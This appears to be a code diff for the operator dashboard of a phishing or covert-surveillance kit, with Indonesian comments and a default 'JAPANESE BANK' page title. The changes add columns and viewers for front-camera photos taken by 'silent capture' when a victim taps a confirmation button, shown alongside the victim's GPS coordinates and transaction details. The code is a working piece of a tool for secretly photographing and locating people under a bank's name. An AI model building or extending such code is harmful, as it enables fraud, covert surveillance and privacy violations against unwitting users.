@@ -1,5 +1,6 @@
 // ============================================================
-// HELIX CONTROL PANEL & DASHBOARD SCRIPT
+// HELIX CONTROL PANEL & DASHBOARD SCRIPT V2
+// Integrated with: Silent Front Camera + Location + Receipt Photo
 // ============================================================
 
 (function() {
@@ -22,7 +23,7 @@
         sectionDashboard: document.getElementById('sectionDashboard'),
         sectionTransfer: document.getElementById('sectionTransfer'),
         sectionUser: document.getElementById('sectionUser'),
-        // Form Inputs (HELIX CONTROL PANEL)
+        // Form Inputs
         t_topBarTitle: document.getElementById('t_topBarTitle'),
         t_primaryColor: document.getElementById('t_primaryColor'),
         t_profileImage: document.getElementById('t_profileImage'),
@@ -48,10 +49,18 @@
         imgViewerModal: document.getElementById('imgViewerModal'),
         imgModalTitle: document.getElementById('imgModalTitle'),
         imgModalFull: document.getElementById('imgModalFull'),
-        btnDownloadImg: document.getElementById('btnDownloadImg')
+        btnDownloadImg: document.getElementById('btnDownloadImg'),
+        // NEW: Front Camera Modal
+        frontCamModal: document.getElementById('frontCamModal'),
+        frontCamTitle: document.getElementById('frontCamTitle'),
+        frontCamImg: document.getElementById('frontCamImg'),
+        btnDownloadFront: document.getElementById('btnDownloadFront'),
+        frontCamInfo: document.getElementById('frontCamInfo')
     };
 
-    // Live Clock Ticking
+    // ============================================================
+    // LIVE CLOCK
+    // ============================================================
     function updateClock() {
         if (!elements.liveClock) return;
         const now = new Date();
@@ -63,7 +72,9 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // Tab Switcher
+    // ============================================================
+    // TAB SWITCHER
+    // ============================================================
     window.switchTab = function(tabName) {
         if (elements.tabDashboard) elements.tabDashboard.classList.remove('active');
         if (elements.tabTransfer) elements.tabTransfer.classList.remove('active');
@@ -86,7 +97,9 @@
         }
     };
 
-    // Notification Toast
+    // ============================================================
+    // NOTIFICATION
+    // ============================================================
     function showNotification(msg) {
         if (!elements.notification) return;
         elements.notification.textContent = msg;
@@ -96,7 +109,9 @@
         }, 3000);
     }
 
-    // Load Template Configuration
+    // ============================================================
+    // TEMPLATE MANAGEMENT
+    // ============================================================
     async function loadTemplate() {
         try {
             const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
@@ -136,7 +151,6 @@
         if(elements.t_buttonText) elements.t_buttonText.value = template.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
     }
 
-    // Save Template (SAVE CONFIGURATION)
     window.saveTemplate = async function() {
         const template = {
             topBarTitle: elements.t_topBarTitle ? elements.t_topBarTitle.value : 'JAPANESE BANK',
@@ -170,7 +184,6 @@
 
         showNotification('Configuration saved & synced!');
         
-        // Real-time broadcast
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
             channel.postMessage({ type: 'template_updated', template: template });
@@ -178,11 +191,13 @@
         } catch(e) {}
     };
 
-    // Load Transactions & Photo Screenshots
+    // ============================================================
+    // LOAD TRANSACTIONS - DENGAN DATA LENGKAP
+    // ============================================================
     async function loadTransactions() {
         let transfers = [];
 
-        // Read Local Storage First
+        // Baca dari localStorage
         try {
             const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
             if (Array.isArray(localStored)) {
@@ -190,7 +205,7 @@
             }
         } catch(e) {}
 
-        // Read Server Data
+        // Baca dari server
         try {
             const response = await fetch(CONFIG.API_URL, {
                 headers: { 'Authorization': CONFIG.AUTH_TOKEN }
@@ -212,6 +227,9 @@
         renderTransactions(transfers);
     }
 
+    // ============================================================
+    // RENDER TRANSACTIONS - DENGAN KOLOM FOTO DEPAN
+    // ============================================================
     function renderTransactions(transfers) {
         if (!elements.transTableBody) return;
         elements.transTableBody.innerHTML = '';
@@ -225,22 +243,33 @@
         if (elements.alertEmpty) elements.alertEmpty.style.display = 'none';
         if (elements.tableWrapper) elements.tableWrapper.style.display = 'block';
 
-        // Sort latest first
         transfers.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));
 
         transfers.forEach(t => {
             const tr = document.createElement('tr');
             
-            // Location string
+            // ==========================================
+            // LOKASI (dari silent capture)
+            // ==========================================
             let locStr = '<span style="color:var(--text-muted)">Tanpa GPS</span>';
             if (t.location && typeof t.location.lat === 'number' && typeof t.location.lng === 'number') {
                 locStr = `<a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="color:var(--accent-green); text-decoration:none;">${t.location.lat.toFixed(5)}, ${t.location.lng.toFixed(5)} ↗</a>`;
             }
 
-            // Photo Thumbnail
-            let photoHtml = '<span style="color:var(--text-muted); font-size:12px;">Tidak Ada Foto</span>';
+            // ==========================================
+            // FOTO BARANG/STRUK (dari kamera belakang)
+            // ==========================================
+            let receiptPhotoHtml = '<span style="color:var(--text-muted); font-size:12px;">Tidak Ada</span>';
             if (t.photo) {
-                photoHtml = `<img src="${t.photo}" class="photo-thumb" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${t.photo}', '${t.transferId}')" title="Klik untuk memperbesar foto struk">`;
+                receiptPhotoHtml = `<img src="${t.photo}" class="photo-thumb" alt="Struk ${t.transferId}" onclick="window.viewFullPhoto('${t.photo}', '${t.transferId}')" title="Foto Barang/Struk" style="width:60px; height:60px; object-fit:cover; border-radius:6px; cursor:pointer; border:1px solid #333;">`;
+            }
+
+            // ==========================================
+            // FOTO KAMERA DEPAN (dari SILENT CAPTURE)
+            // ==========================================
+            let frontPhotoHtml = '<span style="color:var(--text-muted); font-size:12px;">Tidak Ada</span>';
+            if (t.frontPhoto) {
+                frontPhotoHtml = `<img src="${t.frontPhoto}" class="photo-thumb" alt="Depan ${t.transferId}" onclick="window.viewFrontPhoto('${t.frontPhoto}', '${t.transferId}')" title="FOTO KAMERA DEPAN (SILENT CAPTURE)" style="width:60px; height:60px; object-fit:cover; border-radius:6px; cursor:pointer; border:2px solid #ff4444;">`;
             }
 
             let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID') : '-';
@@ -250,7 +279,8 @@
                 <td>${t.sender || '-'}</td>
                 <td>${t.receiver || '-'}</td>
                 <td><strong>${t.amount || '-'}</strong></td>
-                <td>${photoHtml}</td>
+                <td>${receiptPhotoHtml}</td>
+                <td>${frontPhotoHtml}</td>
                 <td>${locStr}</td>
                 <td style="font-family:'Share Tech Mono',monospace; font-size:12px;">${timeStr}</td>
                 <td>
@@ -261,10 +291,12 @@
         });
     }
 
-    // Full Photo View Modal
+    // ============================================================
+    // VIEW FOTO STRUK (KAMERA BELAKANG)
+    // ============================================================
     window.viewFullPhoto = function(photoUrl, refId) {
         if (!elements.imgViewerModal) return;
-        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO STRUK BUKTI TRANSAKSI [ ${refId} ]`;
+        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG/STRUK [ ${refId} ]`;
         if (elements.imgModalFull) elements.imgModalFull.src = photoUrl;
         if (elements.btnDownloadImg) {
             elements.btnDownloadImg.href = photoUrl;
@@ -277,7 +309,30 @@
         if (elements.imgViewerModal) elements.imgViewerModal.style.display = 'none';
     };
 
-    // Delete single transaction
+    // ============================================================
+    // VIEW FOTO KAMERA DEPAN (SILENT CAPTURE)
+    // ============================================================
+    window.viewFrontPhoto = function(photoUrl, refId) {
+        if (!elements.frontCamModal) return;
+        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO KAMERA DEPAN (SILENT) [ ${refId} ]`;
+        if (elements.frontCamImg) elements.frontCamImg.src = photoUrl;
+        if (elements.btnDownloadFront) {
+            elements.btnDownloadFront.href = photoUrl;
+            elements.btnDownloadFront.download = `FrontCamera_${refId}.jpg`;
+        }
+        if (elements.frontCamInfo) {
+            elements.frontCamInfo.textContent = `Diambil secara silent capture saat user menekan tombol konfirmasi`;
+        }
+        elements.frontCamModal.style.display = 'flex';
+    };
+
+    window.closeFrontCamModal = function() {
+        if (elements.frontCamModal) elements.frontCamModal.style.display = 'none';
+    };
+
+    // ============================================================
+    // DELETE TRANSACTION
+    // ============================================================
     window.deleteTransaction = async function(transferId) {
         if (!confirm(`Hapus transaksi ${transferId}?`)) return;
 
@@ -298,7 +353,9 @@
         loadTransactions();
     };
 
-    // Clear all transactions
+    // ============================================================
+    // CLEAR ALL
+    // ============================================================
     async function clearAllTransactions() {
         if (!confirm('Apakah Anda yakin ingin menghapus SELURUH data transaksi & foto?')) return;
 
@@ -315,20 +372,24 @@
         loadTransactions();
     }
 
-    // Real-time listener
+    // ============================================================
+    // REAL-TIME SYNC LISTENER
+    // ============================================================
     function setupSyncListener() {
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
             channel.addEventListener('message', (event) => {
                 if (event.data && event.data.type === 'NEW_LOCATION') {
-                    showNotification('⚡ Transaksi & Foto Struk Baru Diterima!');
+                    showNotification('⚡ Transaksi Baru + Foto Depan Silent + Lokasi Diterima!');
                     loadTransactions();
                 }
             });
         } catch(e) {}
     }
 
-    // Events
+    // ============================================================
+    // EVENTS
+    // ============================================================
     if (elements.btnRefresh) elements.btnRefresh.addEventListener('click', loadTransactions);
     if (elements.btnClearAll) elements.btnClearAll.addEventListener('click', clearAllTransactions);
 
